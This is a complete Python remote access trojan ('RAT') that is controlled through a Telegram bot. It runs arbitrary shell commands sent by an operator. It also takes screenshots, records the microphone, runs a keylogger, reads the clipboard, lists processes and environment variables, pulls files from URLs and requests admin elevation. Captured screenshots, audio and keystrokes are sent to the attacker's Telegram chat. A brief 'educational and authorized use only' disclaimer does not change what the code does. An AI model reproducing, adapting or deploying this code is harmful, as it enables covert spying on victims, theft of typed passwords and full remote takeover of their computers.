import requests
import os
import platform
import subprocess
import psutil
import io
import time
import pyperclip
import socket
import ctypes
import sys
import atexit
import signal
import threading
import pyautogui
import sounddevice as sd
import numpy as np
import wave
from pynput import keyboard

TOKEN = "<Your_Bot_Token>"
CHAT_ID = "<Your_Chat_ID>"

BASE_URL = f"https://api.telegram.org/bot{TOKEN}/"

exit_event = threading.Event()  # Use an event to handle exit cleanly

# Global Variables
keylogger_running = False
keylog_data = []

def run_as_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def get_updates(offset):
    url = BASE_URL + f"getUpdates?offset={offset}&timeout=60"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json().get("result", [])
    return []

def send_message(text):
    url = BASE_URL + "sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    requests.post(url, json=data)
    
def change_directory(path):
    try:
        os.chdir(path)
        return f"Changed directory to: {os.getcwd()}"
    except Exception as e:
        return f"Error changing directory: {str(e)}"

def run_application(app):
    try:
        subprocess.Popen(app, shell=True)
        return f"Running {app}..."
    except Exception as e:
        return f"Error running {app}: {str(e)}"

def get_public_ip():
    try:
        response = requests.get("https://api64.ipify.org?format=json")
        return f"Public IP: {response.json().get('ip', 'Unknown')}"
    except Exception as e:
        return f"Error fetching IP: {str(e)}"


def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        img_byte_arr = io.BytesIO()  # Create an in-memory byte stream
        screenshot.save(img_byte_arr, format='PNG')  # Save screenshot to memory
        img_byte_arr.seek(0)  # Move to the beginning of the stream

        url = BASE_URL + "sendPhoto"
        files = {"photo": img_byte_arr}
        data = {"chat_id": CHAT_ID}

        response = requests.post(url, files=files, data=data)

        if response.status_code == 200:
            return "📸 Screenshot sent successfully!"
        else:
            return f"❌ Failed to send screenshot: {response.text}"

    except Exception as e:
        return f"❌ Error taking screenshot: {str(e)}"


def record_audio(duration):
    """Records audio for the given duration and sends it via Telegram."""
    try:
        duration = min(duration, 60)  # Ensure max duration is 60 sec

        fs = 44100  # Sample rate
        send_message(f"🎤 Recording audio for {duration} seconds...")

        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype=np.int16)
        sd.wait()  # Wait for recording to finish

        # Convert to WAV format
        audio_bytes = io.BytesIO()
        with wave.open(audio_bytes, "wb") as wf:
            wf.setnchannels(2)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes(recording.tobytes())

        audio_bytes.seek(0)

        # Send the recorded audio
        url = BASE_URL + "sendVoice"
        files = {"voice": audio_bytes}
        data = {"chat_id": CHAT_ID}
        response = requests.post(url, files=files, data=data)

        if response.status_code == 200:
            return "🎤 Audio sent successfully!"
        else:
            return f"❌ Failed to send audio: {response.text}"

    except Exception as e:
        return f"❌ Error recording audio: {str(e)}"
    
def download_file(path):
    try:
        with open(path, "rb") as file:
            data = file.read()
        return f"Downloaded {path} ({len(data)} bytes)"
    except Exception as e:
        return f"Error downloading file: {str(e)}"

def upload_file(url, dest):
    try:
        response = requests.get(url)
        with open(dest, "wb") as file:
            file.write(response.content)
        return f"File downloaded from {url} to {dest}"
    except Exception as e:
        return f"Error uploading file: {str(e)}"

def run_shell_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return f"Error executing command: {str(e)}"

def exit_script():
    send_message("🔴 RAT Stopped by Command")
    sys.exit(0)

def get_battery_status():
    if hasattr(psutil, "sensors_battery"):
        battery = psutil.sensors_battery()
        if battery:
            return f"Battery: {battery.percent}% | Plugged In: {'Yes' if battery.power_plugged else 'No'}"
        else:
            return "Battery information not available."

def activate_keylogger():
    """Start the keylogger for 1 minute, capturing keystrokes."""
    global keylogger_running, keylog_data

    if keylogger_running:
        return "⚠️ Keylogger is already running!"

    keylogger_running = True
    keylog_data.clear()  # Reset previous logs

    def on_press(key):
        """Handles key press events."""
        try:
            keylog_data.append(key.char if key.char else str(key))
        except AttributeError:
            keylog_data.append(str(key))

    def stop_keylogger(listener):
        """Stops the keylogger after 1 minute and sends the logs."""
        global keylogger_running
        time.sleep(60)  # Run for 60 seconds
        listener.stop()
        keylogger_running = False

        if keylog_data:
            send_message(f"📝 Keylog (Last 1 min):\n{' '.join(keylog_data)}")
        else:
            send_message("⚠️ No keystrokes detected.")
        
        keylog_data.clear()  # Clear logs after sending

    send_message("⌨️ Keylogger activated! Running for 1 minute...")

    # Start Keylogger
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Stop Keylogger after 1 min
    stop_thread = threading.Thread(target=stop_keylogger, args=(listener,), daemon=True)
    stop_thread.start()

    return "✅ Keylogger is now running for 1 minute!"


def handle_updates(updates):
    highest_update_id = 0
    for update in updates:
        if "message" in update and "text" in update["message"]:
            response = execute_command(update["message"]["text"])
            send_message(response)
        highest_update_id = max(highest_update_id, update["update_id"])
    return highest_update_id

def cleanup():
    send_message("🛑 RAT Process Terminated Unexpectedly!")

atexit.register(cleanup)

def get_latest_update_id():
    """Fetch the latest update ID to prevent executing old commands."""
    updates = get_updates(0)
    if updates:
        return max(update["update_id"] for update in updates) + 1
    return 0

def execute_command(command_text):
    """Executes the given command after converting to lowercase."""
    command_text = command_text.strip().lower()  # Normalize input
    parts = command_text.split()
    
    if not parts:
        return "⚠️ No command entered."
    
    command = parts[0]

    # Special case for commands that expect arguments
    if command == "cd" and len(parts) > 1:
        return change_directory(parts[1])
    elif command == "run" and len(parts) > 1:
        return run_application(" ".join(parts[1:]))
    elif command == "cmd" and len(parts) > 1:
        return run_shell_command(" ".join(parts[1:]))
    elif command == "download" and len(parts) > 1:
        return download_file(parts[1])
    elif command == "upload" and len(parts) > 2:
        return upload_file(parts[1], parts[2])
    elif command == "keylogger" and len(parts) > 1 and parts[1] == "--activate":
        return activate_keylogger()
    elif command == "recordmic":
        if len(parts) > 1 and parts[1].isdigit():
            duration = int(parts[1])
            if duration > 60:
                return "⚠️ Please enter a duration between 1 and 60 seconds."
            return record_audio(duration)
        return "⚠️ Usage: recordmic {duration} (1-60 seconds)"

    # Simple commands with no arguments
    commands = {
        "info": lambda: f"OS: {platform.system()}\nArch: {platform.architecture()[0]}\nUser: {os.getlogin()}",
        "cpu": lambda: f"CPU Usage: {psutil.cpu_percent(interval=1)}%",
        "ram": lambda: f"RAM Usage: {psutil.virtual_memory().percent}%",
        "disk": lambda: f"Disk Usage: {psutil.disk_usage('/').percent}%",
        "network": lambda: "\n".join(
                    [f"{iface}: {addr.address}" for iface, addrs in psutil.net_if_addrs().items() for addr in addrs if addr.family == socket.AF_INET]
        ),
        "processes": lambda: "\n".join([f"{p.pid} - {p.name()}" for p in psutil.process_iter(['pid', 'name'])]),
        "clipboard": lambda: f"Clipboard: {pyperclip.paste()}",
        "env": lambda: "\n".join(os.environ.keys()),
        "ls": lambda: "\n".join(os.listdir(".")),
        "cwd": lambda: f"Current Directory: {os.getcwd()}",
        "exit": exit_script,
        "uptime": lambda: f"System Uptime: {time.time() - psutil.boot_time()} seconds",
        "battery": get_battery_status,
        "ip": get_public_ip,
        "screenshot": lambda: take_screenshot(),
        "keylogger --activate": lambda: activate_keylogger(),
    }

    # Execute the command if it exists in our dictionary
    if command in commands:
        return commands[command]()
    else:
        # Try to run as a shell command if not found in our commands
        return run_shell_command(command_text)


def send_startup_message():
    """Send a startup message, security disclaimer, and command list."""
    send_message("🟢 RAT Started! Listening for commands...")

    disclaimer = (
        "⚠️ WARNING: This tool allows remote code execution (RCE). "
        "Use it ONLY for educational and authorized penetration testing purposes. "
        "Unauthorized use may violate laws and result in legal consequences."
    )
    send_message(disclaimer)

    commands_info = (
        "🛠️ *Available Commands & Their Purpose:*\n"
        "📌 `info` - Get system details (OS, architecture, user).\n"
        "📌 `cpu` - Get CPU usage.\n"
        "📌 `ram` - Get RAM usage.\n"
        "📌 `disk` - Get disk usage.\n"
        "📌 `network` - Get active network interfaces.\n"
        "📌 `processes` - List running processes.\n"
        "📌 `clipboard` - Retrieve clipboard content.\n"
        "📌 `env` - List system environment variables.\n"
        "📌 `ls` - List files in the current directory.\n"
        "📌 `cwd` - Get the current working directory.\n"
        "📌 `cd <path>` - Change the current directory.\n"
        "📌 `run <app>` - Execute an application.\n"
        "📌 `cmd <command>` - Run a shell command.\n"
        "📌 `download <path>` - Download a file from the system.\n"
        "📌 `upload <url> <dest>` - Upload a file from a URL.\n"
        "📌 `keylogger --activate` - Start a keylogger.\n"
        "📌 `screenshot` - Take a screenshot and send it.\n"
        "📌 `recordmic {duration}` - Record audio (10 sec) and save.\n"
        "📌 `battery` - Get battery status.\n"
        "📌 `ip` - Get public IP address.\n"
        "📌 `exit` - Stop the script."
    )
    send_message(commands_info)

def main():
    send_startup_message()  # Send startup messages in order

    # Discard all old updates at startup
    offset = get_latest_update_id()
    
    try:
        while not exit_event.is_set():
            updates = get_updates(offset)
            if updates:
                offset = handle_updates(updates) + 1  # Process only new updates
            time.sleep(1)
    except SystemExit:
        send_message("🛑 RAT Process Terminated Gracefully!")  # Expected shutdown
    except Exception as e:
        send_message(f"⚠️ RAT Encountered an Error: {str(e)}")
    finally:
        send_message("🛑 RAT Process Stopped!")

def exit_script():
    """Handle graceful exit."""
    send_message("🛑 RAT Process Terminated Gracefully!")  # Confirmed shutdown
    exit_event.set()  # Stop the loop
    os._exit(0)  # Force exit without exceptions


def handle_exit(signum, frame):
    """Handle forced exits like SIGINT or SIGTERM."""
    send_message("⚠️ RAT Killed Forcefully!")
    exit_event.set()
    sys.exit(0)

# Register signal handlers
signal.signal(signal.SIGINT, handle_exit)
signal.signal(signal.SIGTERM, handle_exit)


if __name__ == "__main__":
    main()